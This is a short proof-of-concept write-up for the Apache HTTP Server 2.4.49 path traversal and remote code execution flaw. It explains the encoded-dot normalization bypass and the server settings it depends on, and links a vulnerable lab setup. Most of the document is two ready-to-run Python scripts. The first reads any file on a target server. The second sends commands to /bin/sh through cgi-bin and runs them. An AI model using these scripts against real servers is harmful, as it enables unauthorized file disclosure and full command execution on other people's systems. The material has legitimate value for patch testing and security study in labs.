# Summary
Apache HTTP Server 2.4.49 is vulnerable to Path Traversal and Remote Code execution. Path Traversal arises due to the inadiquate normalization function and misconfiguration. RCE is achieved by chaining the path traversal and enabled mod_agi module which can be set in the server config file.


# Details
### Path Traversal: 
When the user makes a get request like, .%2e/.%2e/.%2e/.%2e/.%2e/.%2e/sample/file The normalization function fails to decode the second dot from url-encoding which results the filter bypass. Along with this, the directory directive in the server configuration should be set as, '<Directory /> Require all granted </Directory>' for the path traversal to work.
### RCE: 
The path traversal can be used to get remote code execution when the mod_cgi module is enabled in the httpd.conf configuration file. This allows an attacker to use the path traversal vulnerability and call any binary on the system using HTTP POST requests and execute any commands.

# PoC (python3)
### For path traversal:
```
import requests

def payL():
    session = requests.Session()
    u=input("Enter base url: ")
    file=input("Enter full path of file to read: ")
    url=u+"cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e"+file
    req = requests.Request(method='GET', url=url).prepare()
    req.url = url
    print(session.send(req).text)

payL()
```
### For RCE:
```
import requests

def payL():
    session = requests.Session()
    u=input("Enter base url: ")
    cmd=input("Enter command to execute: ")
    data="echo Content-Type: text/plain; echo; "+cmd
    url=u+"cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
    req = requests.Request(method='POST', url=url, data=data).prepare()
    req.url = url
    print(session.send(req).text)

payL()
```

# Lab set-up
https://github.com/retrymp3/apache2.4.49VulnerableLabSetup